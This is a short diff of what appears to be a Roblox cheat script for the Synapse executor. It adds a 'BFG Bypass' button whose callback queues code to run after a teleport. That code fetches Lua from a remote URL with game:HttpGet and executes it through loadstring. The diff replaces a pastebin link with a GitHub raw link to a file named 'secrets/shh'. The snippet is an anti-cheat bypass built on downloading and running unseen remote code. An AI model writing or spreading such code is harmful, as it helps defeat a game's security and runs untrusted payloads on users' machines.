@@ -20,7 +20,7 @@ BFGSec:AddButton({
 Name = "BFG Bypass",
 Flag = "BFGSec_Bypass",
 Callback = function()
-syn.queue_on_teleport("loadstring(game:HttpGet('https://pastebin.com/raw/jvQH6CfS'))()")
+syn.queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/nadic/secrets/main/shh'))()")
 wait(0.2)
 local tpservice= game:GetService("TeleportService")
 local plr = game.Players.LocalPlayer
